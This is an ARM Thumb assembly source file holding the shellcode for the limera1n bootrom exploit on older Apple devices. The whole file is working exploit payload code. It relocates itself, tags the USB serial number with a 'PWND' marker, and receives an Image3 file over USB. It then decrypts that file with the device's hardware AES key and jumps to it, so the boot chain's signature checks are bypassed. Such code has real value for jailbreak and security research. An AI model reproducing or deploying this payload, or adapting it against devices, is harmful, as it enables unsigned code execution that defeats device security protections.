@ limera1n-shellcode.S
@ Authors: npupyshev (Image3 loader), axi0mX (shellcode bootstrap)
@ Shellcode for limera1n exploit that loads, optionally decrypts and executes an Image3 file.
@ This shellcode appends PWND:[limera1n] string to the 

.text

.pool
.set free,                          0x3b95
.set memmove,                       0x84dc
.set strlcat,                       0x90c9

.set usb_wait_for_image,            0x4c85
.set jump_to,                       0x5a5d

.set image3_load_create_object,     0x412d
.set image3_load_verify_tag,        0x442d
.set image3_load_get_tag_data,      0x405d
.set aes_crypto_cmd,                0x686d

.set gLeakingDFUBuffer,             0x8402dbcc
.set gUSBSerialNumber,              0x8402e0e0

.set kShellcodeBase,                0x84039800
.set kShellcodeSize,                0x180
.set kStackBase,                    0x8403c000
.set kDFUImageLoadAddress,          0x84000000
.set kDFUImageMaxSize,              0x2c000

_start: .global _start
.code 16
	B relocate_shellcode	
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	NOP
	
relocate_shellcode:
	MOV R1, PC
	SUB R1, #4                                  @ R1 = PC - 4;
	
	LDR R0, =kShellcodeBase
	CMP R0, R1
	BEQ pwned_dfu_start                         @ if (R1 == kShellcodeBase) goto pwned_dfu_start;
	
	LDR R2, =kShellcodeSize                     @ R2 = kShellcodeSize;
	LDR R3, =memmove
	BLX R3                                      @ memmove(kShellcodeBase, R1, kShellcodeSize);
	
	LDR R3, =kShellcodeBase
	ADD R3, #1
	BX R3                                       @ goto (kShellcodeBase + 1);
	
pwned_dfu_start:
    LDR R0, =kStackBase
    MOV SP, R0                                  @ SP = kStackBase;
	
    LDR R0, =gUSBSerialNumber
    ADR R1, PWND_STRING
    MOV R2, #120
    LDR R3, =strlcat
    BLX R3                                      @ strlcat(gUSBSerialNumber, PWND_STRING, 120)
	
pwned_dfu_loop:
	LDR R0, =kDFUImageLoadAddress
	LDR R1, =kDFUImageMaxSize
	LDR R4, =usb_wait_for_image
	BLX R4                                      @ ret = usb_wait_for_image(kDFUImageLoadAddress, MAX_SIZE)
	
	MOV R4, R0                                  @ R4 = R0
	
	LDR R1, =gLeakingDFUBuffer
	LDR R0, [R1]
	
	MOV R2, #0
	STR R2, [R1]                                @ *gLeakingDFUBuffer = 0
	
	LDR R3, =free
	BLX R3                                      @ free(*gLeakingDFUBuffer)
	
    CMP R4, #0
    BLT pwned_dfu_loop                          @ if (R4 < 0) goto pwned_dfu_loop;
	
image3_load:
	@ SP + 0x00 = &arg5
	@ SP + 0x04 = &arg6
	@ SP + 0x08 = &arg7
	@ SP + 0x0C = &objectHandle
	@ SP + 0x10 = &dataAddress
	@ SP + 0x14 = &dataLength
	@ SP + 0x18 = &iv[16]
	@ SP + 0x28 = &key[32]
	
	SUB SP, #0x48
	
	@ ret = image3_load_create_object(&objectHandle, kDFUImageLoadAddress, kDFUImageMaxSize, false);
	MOV R0, SP
	ADD R0, #0xC                                @ arg1 = &objectHandle
	LDR R1, =kDFUImageLoadAddress               @ arg2 = kDFUImageLoadAddress
	LDR R2, =kDFUImageMaxSize                   @ arg3 = kDFUImageMaxSize
	MOV R3, #0                                  @ arg4 = false (no copy)
	LDR R4, =image3_load_create_object
	BLX R4
	
	@ if (ret != 0) goto image3_load_fail;
	CMP R0, #0
	BNE image3_load_fail
	
	@ ret = image3_load_get_tag_data(objectHandle, 'DATA', &dataAddress, &dataLength, 0);
	STR R0, [SP]                                @ arg5 = 0
	STR R0, [SP, #0x14]                         @ dataLength = 0
	LDR R0, [SP, #0xC]                          @ arg1 = objectHandle
	LDR R1, =0x44415441                         @ arg2 = 'DATA'
	MOV R2, SP
	ADD R2, #0x10                               @ arg3 = &dataAddress
	ADD R3, R2, #0x4                            @ arg4 = &dataLength
	LDR R4, =image3_load_get_tag_data
	BLX R4
	
	@ if (ret != 0) goto image3_load_fail;
	CMP R0, #0
	BNE image3_load_fail
	
	@ prepare image3_load_get_tag_data pointer
	LDR R4, =image3_load_get_tag_data
	MOV R6, #0                                  @ i = 0
	
image3_load_kbag_loop:
	MOV R0, #56
	STR R0, [SP, #0x08]                         @ max size for KBAG
	
	@ image3_load_get_tag_data(objectHandle, 'KBAG', &arg6, &arg7);
	LDR R0, [SP, #0xC]                          @ arg1 = objectHandle
	LDR R1, =0x4b424147                         @ arg2 = 'KBAG'
	ADD R2, SP, #0x04                           @ arg3 = &arg6 (store keybag address in arg6)
	ADD R3, R2, #0x04                           @ arg4 = &arg7 (store keybag size in arg7)
	STR R6, [SP]                                @ arg5 = i
	BLX R4
	
	CMP R0, #0
	BNE image3_load_copy_data
	
	@ if (keybagLength < MIN_IMG3_KBAG_SIZE) goto image3_load_fail;
	LDR R0, [SP, #0x08]                         @ R0 = keybagLength
	CMP R0, #40                                 @ cryptState + keyLength + iv + AES 128 key
	BLT image3_load_fail

	@ calculate required cryptState
	LDR R1, =0xBF500000
	LDRB R2, [R1]
	MOV R5, #1
	AND R2, R5
	MOV R5, #2
	SUB R5, R2
	@ if (cryptState != R5) continue;
	LDR R1, [SP, #0x04]                         @ R1 = keybagAddr
	LDR R2, [R1]                                @ R2 = cryptState
	CMP R2, R5
	BNE image3_load_kbag_loop
	
	@ if (keySizeBits / 8 + 24 > keybagLength) goto image3_load_fail;
	LDR R2, [R1, #0x04]                         @ R2 = keySizeBits
	LSR R3, R2, #3
	ADD R3, #24                                 @ R3 = keySizeBits / 8 + sizeof(uint32_t) + sizeof(uint32_t) + sizeof(iv)
	CMP R3, R0
	BGT image3_load_fail
	
	MOV R7, #1
	CMP R3, #56
	BEQ image3_load_kbag_key_256
	CMP R3, #48
	BEQ image3_load_kbag_key_192
	CMP R3, #40
	BEQ image3_load_kbag_key_128
	B image3_load_fail
	
image3_load_kbag_key_128:
	MOV R7, #0
image3_load_kbag_key_256:
	LSL R7, R7, #1
image3_load_kbag_key_192:
	LSL R7, R7, #28
	
image3_load_kbag_key_ok:
	@ memmove(&iv, &keybag->iv, sizeof(iv) + keySizeBits / 8);
	MOV R0, SP
	ADD R0, #0x18                               @ arg1 = &iv
	ADD R1, #8                                  @ arg2 = &keybag->iv
	SUB R3, #8
	MOV R2, R3                                  @ arg3 = keySizeBits / 8 + sizeof(iv)
	MOV R6, R2
	LDR R4, =memmove
	BLX R4
	
	@ aes_crypto_cmd(17, &iv, &iv, sizeof(iv) + keySizeBits / 8, 0x20000200, NULL, NULL);
	MOV R0, #17                                 @ arg1 = 17
	MOV R1, SP
	ADD R1, #0x18                               @ arg2 = &iv
	MOV R2, R1                                  @ arg3 = &iv
	MOV R3, R6                                  @ arg4 = sizeof(iv) + keySizeBits / 8
	LDR R4, =0x20000200
	STR R4, [SP]                                @ arg5 = 0x20000200
	MOV R4, #0
	STR R4, [SP, #4]                            @ arg6 = 0
	STR R4, [SP, #8]                            @ arg7 = 0
	LDR R4, =aes_crypto_cmd
	BLX R4
	
	@ aes_crypto_cmd(17, dataAddress, dataAddress, dataLength, enc_flags, key, iv);
	MOV R0, #17                                 @ arg1 = 17
	LDR R1, [SP, #0x10]                         @ arg2 = dataAddress
	MOV R2, R1                                  @ arg3 = dataAddress
	LDR R3, [SP, #0x14]                         @ arg4 = dataLength
	STR R7, [SP]                                @ arg5 = enc_flags
	MOV R7, SP
	ADD R7, #0x28
	STR R7, [SP, #4]                            @ arg6 = key
	SUB R7, #0x10
	STR R7, [SP, #8]                            @ arg7 = iv
	BLX R4
	
image3_load_copy_data:
	@ memmove(kDFUImageLoadAddress, dataAddress, dataLength);
	LDR R0, =kDFUImageLoadAddress               @ arg1 = kDFUImageLoadAddress
	LDR R1, [SP, #0x10]                         @ arg2 = dataAddress
	LDR R2, [SP, #0x14]                         @ arg3 = dataLength
	MOV R5, R0
	LDR R4, =memmove
	BLX R4
	
	@ jump_to(0, kDFUImageLoadAddress, 0);
	MOV R0, #0                                  @ arg1 = 0
	MOV R1, R5                                  @ arg2 = kDFUImageLoadAddress
	MOV R2, #0                                  @ arg3 = 0
	LDR R4, =jump_to
	BLX R4

image3_load_fail:
	ADD SP, SP, #0x48
	B pwned_dfu_loop

.align 2

PWND_STRING:
.ascii " PWND:[limera1n]\x00"
